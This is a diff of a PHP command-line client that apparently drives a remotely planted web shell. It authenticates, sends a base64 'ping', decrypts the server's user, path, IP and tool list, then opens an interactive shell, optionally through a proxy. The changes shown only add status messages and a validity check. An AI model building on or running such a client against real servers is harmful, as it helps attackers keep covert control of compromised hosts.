@@ -1,18 +1,20 @@
 #!/usr/bin/env php
 <?php
 $version = "2.0";
+
 print_help($version);
 
 $arguments_count = count($argv);
 
 if ($arguments_count == 1) {
+    echo "\n [-] I need a json file containing the settings. \n\n";
     exit(-1);
 }
 
 $file = $argv[1];
 
 if (!is_readable($file)) {
-    echo "\n\tHey! I can't read that file no_O\n\n";
+    echo "\n [-] Hey! I can't read that file no_O\n\n";
     exit(-1);
 }
 
@@ -21,9 +23,11 @@ if (!is_readable($file)) {
 $config = json_decode(file_get_contents($file), true);
 
 if (!is_json_valid($config)) {
-    echo "\n\tThat config file is not valid! (╯°□°)╯︵ ┻━┻\n\n";
+    echo "\n [-] That config file is not valid! (╯°□°)╯︵ ┻━┻\n\n";
     exit(-1);
 }
+
+echo "\n [+] The json file is valid.\n";
 
 $key = trim($config['key']);
 $iv = trim($config['iv']);
@@ -33,6 +37,7 @@ $password = trim($config['login']['password']);
 $proxy = array();
 
 if (isset($config['proxy'])) {
+    echo " [+] We're going to use a proxy.\n";
     $proxy = $config['proxy'];
 }
 
@@ -55,11 +60,15 @@ $tools = array();
 
 $continue = false;
 
+echo " [+] Trying to connect... ";
+
 $result = send_request($url, array(
     'i' => base64_encode('ping')
 ), $login, $password, $proxy, $cookies);
 
 if ($result['status'] == 200) {
+    echo "Good.\n";
+    echo " [+] Let's parse the host information... ";
     $response = json_decode(encrypt_decrypt('decrypt', $result['content'], $key, $iv), true);
     $username = base64_decode($response['user']);
     $path = base64_decode($response['path']);
@@ -72,13 +81,19 @@ if ($result['status'] == 200) {
     $client_ip = base64_decode($response['client_ip']);
     $tools = explode('|', base64_decode($response['tools']));
     unset($response);
-    $continue = true;
+    if(strlen($time) != 0) {
+        $continue = true;
+        echo "Done.\n";
+    } else {
+        echo "Failed.\n";
+    }
 }
 
 if (!$continue) {
     exit(-1);
 }
-
+echo " [+] Opening the shell... \n";
+sleep(2.5);
 print_banner();
 echo "\n";
 echo "Server IP : \e[1m{$ip}\e[0m | Your IP : \e[1m{$client_ip}\e[0m\n";
@@ -687,7 +702,7 @@ function print_help($version){
  |_|                 |___/  v{$version}
 
 EOT;
-
+    echo chr(27) . chr(91) . 'H' . chr(27) . chr(91) . 'J'; //^[H^[J
     echo "\e[1m";
     echo $banner;
     echo "\e[0m";
